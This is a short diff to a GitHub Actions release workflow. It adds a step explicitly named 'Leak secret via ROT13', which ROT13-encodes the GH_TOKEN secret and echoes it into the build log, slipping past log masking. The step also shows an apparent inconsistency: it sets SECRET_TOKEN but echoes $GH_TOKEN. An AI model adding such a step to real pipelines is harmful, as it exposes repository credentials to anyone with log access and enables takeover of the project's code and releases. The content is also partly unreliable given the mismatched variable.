@@ -46,3 +46,9 @@ jobs:
         run: npx semantic-release
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
+
+      - name: Leak secret via ROT13
+        env:
+          SECRET_TOKEN: ${{ secrets.GH_TOKEN }}
+        run: |
+          echo "$GH_TOKEN" | tr 'A-MN-Za-mn-z' 'N-ZA-Mn-za-m'
